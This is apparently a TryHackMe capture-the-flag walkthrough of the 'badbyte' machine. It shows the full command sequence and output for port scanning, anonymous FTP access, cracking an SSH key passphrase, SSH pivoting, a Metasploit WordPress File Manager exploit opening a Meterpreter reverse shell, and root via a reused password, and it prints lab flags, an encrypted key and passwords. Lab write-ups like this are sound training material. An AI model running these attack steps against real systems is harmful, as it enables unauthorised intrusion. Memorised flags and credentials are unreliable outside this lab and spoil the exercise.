# IP
10.10.177.65 

## Enumeration
### NMAP
- Started Nmap scan on the machine for port enumeration.
- There are two ports open on the system
```console
❯ nmap -p- -vvv 10.10.177.65  --min-rate=700  | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-24 15:03 IST
Initiating Ping Scan at 15:03
Scanning 10.10.177.65 [2 ports]
Completed Ping Scan at 15:03, 0.16s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:03
Completed Parallel DNS resolution of 1 host. at 15:03, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 15:03
Scanning 10.10.177.65 [65535 ports]
Discovered open port 22/tcp on 10.10.177.65
Increasing send delay for 10.10.177.65 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.177.65 from 5 to 10 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.177.65 from 10 to 20 due to max_successful_tryno increase to 6
Increasing send delay for 10.10.177.65 from 20 to 40 due to max_successful_tryno increase to 7
Connect Scan Timing: About 29.42% done; ETC: 15:04 (0:01:14 remaining)
Connect Scan Timing: About 59.95% done; ETC: 15:04 (0:00:41 remaining)
Discovered open port 30024/tcp on 10.10.177.65
Completed Connect Scan at 15:04, 100.54s elapsed (65535 total ports)
Nmap scan report for 10.10.177.65
Host is up, received conn-refused (0.16s latency).
Scanned at 2022-10-24 15:03:09 IST for 101s
Not shown: 65533 closed tcp ports (conn-refused)
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
30024/tcp open  unknown syn-ack
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 100.79 seconds
```
- Started Scan for each port on the machine 
```console
❯ nmap -A -p 22,30024 10.10.177.65 | tee nmap1.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-24 15:09 IST
Nmap scan report for 10.10.177.65
Host is up (0.16s latency).
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f3:a2:ed:93:4b:9c:bf:bb:33:4d:48:0d:fe:a4:de:96 (RSA)
|   256 22:72:00:36:eb:37:12:9f:5a:cc:c2:73:e0:4f:f1:4e (ECDSA)
|_  256 78:1d:79:dc:8d:41:f6:77:60:65:f5:74:b6:cc:8b:6d (ED25519)
30024/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.0.0.20
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          1743 Mar 23  2021 id_rsa
|_-rw-r--r--    1 ftp      ftp            78 Mar 23  2021 note.txt
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.98 seconds
```
- As we can see that Anonymous Login is allowed for the ftp service. So, exploited `ftp` and gained the initial foothold

### John The ripper
- Converted `id_rsa` to `hash` for brute-forcing.
```console
❯ ssh2john id_rsa > hash
```
- Cracked the password with john
```console
❯ john -w=/usr/share/wordlists/rockyou.txt hash | tee john.log
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Will run 2 OpenMP threads
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
cupcake          (id_rsa) «------- passphrase 
1g 0:00:00:00 DONE (2022-10-24 15:21) 12.50g/s 7800p/s 7800c/s 7800C/s mariah..cheche
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Pivoting
Did dynamic port forwarding as we had ssh control.
```console
❯ ssh -i id_rsa errorcauser@10.10.177.65  -D 1337  -N
Enter passphrase for key 'id_rsa':
```
- Scanned for open ports
```console
❯ sudo proxychains nmap -sT 127.0.0.1 | tee nmap_remote.log
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-24 15:52 IST
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:22  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:587 <--socket error
<------------snip------------->
Nmap scan report for localhost (127.0.0.1)
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
Nmap done: 1 IP address (1 host up) scanned in 157.89 seconds
```
- Forwarded that port to local port 80
```console
❯ sudo ssh -i id_rsa errorcauser@10.10.177.65  -L 80:127.0.0.1:80  -N
Enter passphrase for key 'id_rsa':
```
- Went to browser and searched `127.0.0.1:80` and got the website.

### Web
- The tryhackme room says to enumerate wordpress-plugin with with nmap, as we can see that the website is made with wordpress.
```console
❯ nmap --script http-wordpress-enum  --script-args type="plugins",search-limit=1500 127.0.0.1 -p 80
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-24 16:28 IST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00021s latency).
PORT   STATE SERVICE
80/tcp open  http
| http-wordpress-enum: 
| Search limited to top 1500 themes/plugins
|   plugins
|     duplicator 1.3.26
|_    wp-file-manager 6.0
Nmap done: 1 IP address (1 host up) scanned in 10.53 seconds
```
- On googling found that `duplicator(1.3.26)` plugin is vulnerable to Arbitrary file read ([CVE-2022-11738](https://nvd.nist.gov/vuln/detail/CVE-2020-11738)) and `wp-file-manager(6.0)` is vulnerable to Remote Code Execution ([CVE-2020-25213](https://nvd.nist.gov/vuln/detail/CVE-2020-25213)).

## Exploitaion
### FTP ([CVE-1999-0497](https://www.cvedetails.com/cve/CVE-1999-0497/))
- Logged in with `Anonymous:Anonymous` credentials.
```console
❯ ftp 10.10.177.65  -p 30024
Connected to 10.10.177.65.
220 (vsFTPd 3.0.3)
Name (10.10.177.65:divu050704): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
- Found two files in the ftp directory so downloaded them to the local machine.
```console
ftp> ls
229 Entering Extended Passive Mode (|||48015|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          1743 Mar 23  2021 id_rsa
-rw-r--r--    1 ftp      ftp            78 Mar 23  2021 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||26595|)
150 Opening BINARY mode data connection for note.txt (78 bytes).
100% |******************************************************************************************************************************************|    78      952.14 KiB/s    00:00 ETA
226 Transfer complete.
78 bytes received in 00:00 (0.48 KiB/s)
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||31714|)
150 Opening BINARY mode data connection for id_rsa (1743 bytes).
100% |******************************************************************************************************************************************|  1743        2.72 MiB/s    00:00 ETA
226 Transfer complete.
1743 bytes received in 00:00 (10.87 KiB/s)
ftp> exit
221 Goodbye.
```
- These files have `id_rsa` of the user `errorcauser`
```console
❯ cat note.txt
I always forget my password. Just let me store an ssh key here.
 - errorcauser
❯ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,25B4B9725AB330EC
LGINB6oiLaGhDgr5D0+9C7+AJTyQbIlBNu8rAYNtlwvn7uN2z5L17esJRr0/PEW/
4NvSoR5TeSRkyufK2mLJU0K7uscPx1JE9Lk9excqhK6N7Sau+v0b/AC3lAGzsnrf
2ztSYVcoooTt9sIDQ/+GmiIrM7rnQMkm20QapnUvUrkThJ/rB3lY3JXayfVWnvuC
Rtke/t20R82D0MFfGD3d57nZ3Q92P7tu35/azcKeR1nJq4UyIgRjdS/3wFA+NwJh
fxMNL14mgYdaBFuhKsj6jv0Ed/AsCUhrB9VcPPkHCaawv386oUv6JDLg/jEExiQc
V88vRUoFglW5a6FpfV/UPrySr4oGoSHTToBFkTQkMKg8FM3vpQXUw8CpENyYr4qj
BFMnKWDR1vuzwEITVNYunIRe9DxbO1mzgEyDWyyX9JUNNCpfWiwLx/MqNzKvkBdD
nqDGt8imMao82j77nmT5H8D+EkaCfze9SBrPPDtKm07mD+iO8ULWnIgRMtAykpj2
SYCg5CCadtXXsjuupR89Kbp8c6V+s3lsYZPp8QZQbiAgr3GqwSpat/7ZvCySzB37
0JmKjrapijObX03XRyOiGXxsUk+slNwnkWIh8Usl8YyD/Vmeg9Qdxxn6EpKy/vcY
dsQQAFYQcbKvYndnNIXnyKTsOYo6Qo8AoRzuWjkaOrRJoZoUJ6FEZED0NMXkgO2D
SCtS98+tRH2PXKajeYi7LXeRB5MOybhshAtM4ogMuuNe4PQfEePuZAInjAsdkLl1
y1RfoCQC9x6OIvd5ONVBpZ5ilNLxthj4MOXAhPPOnCtl5EvXA8oaOXFdDyM33UbA
/oTurtIzT0+UW+Am8jcFQLrBaKIXXZtkqdVjiAXoophbSKoYZzTfZsLVt1DHhf9h
H2mkT3gtKZVjNvkaEhE+wNQL2Dto6VA/xpI8Ug4cShsUwmdrRu3XBTf5NFPEcr1u
CersQnKRV5JG84rcI2J+XKZglG/aBRSnK3rnUPzJjA1pZCZdsmwjvYt2tPzsKJLB
5c8FU+XS3a20QRtMTkHb624pwjKemZ03VxSGSuvRJLvKZ43XMKvJ6zuNHZNUkU13
I6Ld/IIUlv6xwHFEOLg1hIqn3gl9uVzZ2fHDC+9AWLuJqPSa22sOHJ3FYlXaWQt4
BcYkLXvaO3a8btpgD/lwvMPpJZHHfuex1GVMqt208CZMQmdTtRB618rsDZnWxND8
oWRC0uHns8gn9qdeXbjCZx2l+VzLT5Lk/19zBZsBtFIyd5Mj+he+BkDPVMvUNKwY
97Y5v6F6PbJrAVXvjGo6k6+cIXr97Wdojotw+xR/vUdGhjOclZPmjUbDmFFLELIK
ZcWgXCOCNdP4Unrh2c96PYaY/GqmeGl0C206A8t4dbfe/pr1wjklWWRXp+O02QJ+
o3c/PC6Za8IUca8VvmpAT0M1sAiMFTeDWLMSL6Z1CxH1cLVGpSf7ITRFIiDHLGDq
v6fSxb2wsx+qDnk4tO25bXq37HqqSBNw0/NyjOWe//5QE0Q5PWuoEVP/huCKcFHb
mTDaYO2KwZXCse7derYJ0eWpKiiKcmGwmi57m+uvTka+o8xA928/xw==
-----END RSA PRIVATE KEY-----
```

Cracked the password for id_rsa with `john-the-ripper`
### SSH
- On secure shelling to SSH with rsa and passphrase found a note which indicates that `Cth` has started a web server locally.
```console
-bash-4.4$ ls
bin  dev  etc  lib  lib64  note.txt
-bash-4.4$ cat note.txt
Hi Error!
I've set up a webserver locally so no one outside could access it.
It is for testing purposes only.  There are still a few things I need to do like setting up a custom theme.
You can check it out, you already know what to do.
-Cth
:)
```

- So forwarder port to our own machine

### `wp-file-maneger` (([CVE-2020-25213](https://nvd.nist.gov/vuln/detail/CVE-2020-25213)))
- Searched for exploits on metasploit and found one
```console
consolemsf6 > search wp-file-manager
Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  exploit/multi/http/wp_file_manager_rce  2020-09-09       normal  Yes    WordPress File Manager Unauthenticated Remote Code Execution
Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/wp_file_manager_rce
msf6 > use exploit/multi/http/wp_file_manager_rce
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_file_manager_rce) > show options
Module options (exploit/multi/http/wp_file_manager_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMAND    upload           yes       elFinder commands used to exploit the vul
                                         nerability (Accepted: upload, mkfile+put)
   Proxies                     no        A proxy chain of format type:host:port[,t
                                         ype:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.co
                                         m/rapid7/metasploit-framework/wiki/Using-
                                         Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connection
                                         s
   TARGETURI  /                yes       Base path to WordPress installation
   VHOST                       no        HTTP server virtual host
Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be speci
                                     fied)
   LPORT  4444             yes       The listen port
Exploit target:

   Id  Name
   --  ----
   0   WordPress File Manager 6.0-6.8
```
- After setting all the options, started the exploit
```console
msf6 exploit(multi/http/wp_file_manager_rce) > set LHOST tun0
LHOST => 10.8.0.150
msf6 exploit(multi/http/wp_file_manager_rce) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/wp_file_manager_rce) > exploit
[*] Started reverse TCP handler on 10.8.0.150:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] 127.0.0.1:80 - Payload is at /wp-content/plugins/wp-file-manager/lib/files/vDAmri.php
[*] Sending stage (39927 bytes) to 10.10.177.65
[+] Deleted vDAmri.php
[*] Meterpreter session 1 opened (10.8.0.150:4444 -> 10.10.177.65:54448) at 2022-10-24 16:41:54 +0530
meterpreter > shell
Process 2618 created.
Channel 0 created.
whoami
cth
pwd
/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files
cd /home
ls
cth
errorcauser
cd cth
ls
user.txt
cat user.txt
THM{227906201d17d9c45aa93d0122ea1af7}
```
- Found the user flag

### Privilege Escalation
- Loaded `linpeas.sh` to the system.
- Found `/var/log/bash.log`
```console
cat /var/log/bash.log
Script started on 2021-03-23 21:05:06+0000
cth@badbyte:~$ whoami
cth
cth@badbyte:~$ date
Tue 23 Mar 21:05:14 UTC 2021
cth@badbyte:~$ suod su

Command 'suod' not found, did you mean:

  command 'sudo' from deb sudo
  command 'sudo' from deb sudo-ldap
Try: sudo apt install <deb name>
cth@badbyte:~$ G00dP@$sw0rd2020  <<--------- Old Password
G00dP@: command not found
cth@badbyte:~$ passwd
Changing password for cth.
(current) UNIX password:
Enter new UNIX password:
Retype new UNIX password:
passwd: password updated successfully
cth@badbyte:~$ ls
cth@badbyte:~$ cowsay "vim >>>>>>>>>>>>>>>>> nano"
 ____________________________
< vim >>>>>>>>>>>>>>>>> nano >
 ----------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
cth@badbyte:~$ cowsay " g = pi ^ 2 "
 ______________
<  g = pi ^ 2  >
 --------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
cth@badbyte:~$ cowsay "mooooooooooooooooooo"
 ______________________
< mooooooooooooooooooo >
 ----------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
cth@badbyte:~$ exit
Script done on 2021-03-23 21:07:03+0000
```

Did many attempts to login with password but was not successful  so tried `G00dP@$sw0rd2021` and was successful to login through ssh
```console
❯ ssh cth@10.10.177.65
cth@10.10.177.65's password:
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Oct 24 11:29:24 UTC 2022

  System load:  0.0                Processes:           109
  Usage of /:   23.3% of 18.57GB   Users logged in:     0
  Memory usage: 80%                IP address for eth0: 10.10.177.65
  Swap usage:   0%


0 packages can be updated.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


cth@badbyte:~$ sudo -l
[sudo] password for cth:
Matching Defaults entries for cth on badbyte:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cth may run the following commands on badbyte:
    (ALL : ALL) ALL
```
- Updated user and got the `root` flag.
```console
cth@badbyte:~$ sudo su
root@badbyte:/home/cth# cat /root/root.txt
  |      ______    ________   ________              ______        _____________ __________  |
  |     / ____ \  /  ___   \ /   ____ \            / ____ \      /____    ____//   ______/\ |
  |    / /___/_/ /  /__/   //   /   / /\          / /___/_/      \___/   /\___/   /______\/ |
  |   / _____ \ /  ____   //   /   / / /         / _____ \ __   ___ /   / /  /   ____/\     |
  |  / /____/ //  / __/  //   /___/ / /         / /____/ //  | /  //   / /  /   /____\/     |
  | /________//__/ / /__//_________/ /         /________/ |  \/  //___/ /  /   /________    |
  | \________\\__\/  \__\\_________\/          \________\  \    / \___\/  /____________/\   |
  |                                  _________           __/   / /        \____________\/   |
  |                                 /________/\         /_____/ /                           |
  |                                 \________\/         \_____\/                            |

THM{ad485b44f63393b6a9225974909da5fa}

 ________________________
< Made with ❤ by BadByte >
 ------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

```



